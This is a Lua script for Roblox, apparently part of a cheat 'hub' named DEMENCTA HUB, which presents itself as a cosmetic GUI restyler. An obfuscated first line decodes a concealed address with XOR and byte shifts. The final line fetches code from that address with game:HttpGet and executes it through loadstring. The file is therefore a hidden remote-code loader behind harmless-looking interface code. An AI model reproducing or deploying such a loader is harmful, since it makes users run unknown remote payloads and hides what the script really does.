
--[[ STAGE 2: VISUAL CORE ]]
local lGv4fXXKIBpzAl7FvA="\233\219\225\227\230\053\078\084\255\022\014\109\042\054\041\067\052\069\064\064\092\077\098\116\123\107\128\141\125\217\146\164\172\240\183\188\195\190\208\206\220\214\231\208\237\056\243\233\008\004\018\004\024\043\049\116\060\054\068\077\146\028\073\090\095\115\112\076\071\134\119\138\157\132\118\238\130\124\168\198\204\206\193\172\193\210\227\196\227\038\071\049\083\071\238\232\042\026\027\048\060\024\066\073\131\139\096\103\109\159\191\135\116\134"local ilqRm8lXJxZNW4=83 local y_rt41ki53Hf=161 local KiBbSh8KjErV4YLy=0 local vMgJkZeMucV6g=6 local Fqwzmu4QXaC90VIeE=7 local _TAhecYM4GQhX44TI=false local XQyWSUkyPI5O3eJN=bit32 and bit32.bxor if not XQyWSUkyPI5O3eJN then XQyWSUkyPI5O3eJN=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local Ohtvo6EBYVxcvhiRgjuk={}for X9UklNTxpaTdE_RvCsiwQ=1,#lGv4fXXKIBpzAl7FvA do local OgRJlMyGBkaPcd3XtLEZ2=string.byte(lGv4fXXKIBpzAl7FvA,X9UklNTxpaTdE_RvCsiwQ)local lfuodqsPS0IJXhSd0TO=(y_rt41ki53Hf+(X9UklNTxpaTdE_RvCsiwQ*vMgJkZeMucV6g)+Fqwzmu4QXaC90VIeE)%256 if KiBbSh8KjErV4YLy==0 then OgRJlMyGBkaPcd3XtLEZ2=(OgRJlMyGBkaPcd3XtLEZ2-lfuodqsPS0IJXhSd0TO)%256 Ohtvo6EBYVxcvhiRgjuk[X9UklNTxpaTdE_RvCsiwQ]=string.char(XQyWSUkyPI5O3eJN(OgRJlMyGBkaPcd3XtLEZ2,ilqRm8lXJxZNW4))else OgRJlMyGBkaPcd3XtLEZ2=XQyWSUkyPI5O3eJN(OgRJlMyGBkaPcd3XtLEZ2,ilqRm8lXJxZNW4)Ohtvo6EBYVxcvhiRgjuk[X9UklNTxpaTdE_RvCsiwQ]=string.char((OgRJlMyGBkaPcd3XtLEZ2-lfuodqsPS0IJXhSd0TO)%256)end end local TabQGi1MVu1zIYvR9LH_Uq=table.concat(Ohtvo6EBYVxcvhiRgjuk)if _TAhecYM4GQhX44TI then TabQGi1MVu1zIYvR9LH_Uq=string.reverse(TabQGi1MVu1zIYvR9LH_Uq)end local n8bTi8d2ANeCXMcdEbt0=TabQGi1MVu1zIYvR9LH_Uq
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(n8bTi8d2ANeCXMcdEbt0))()
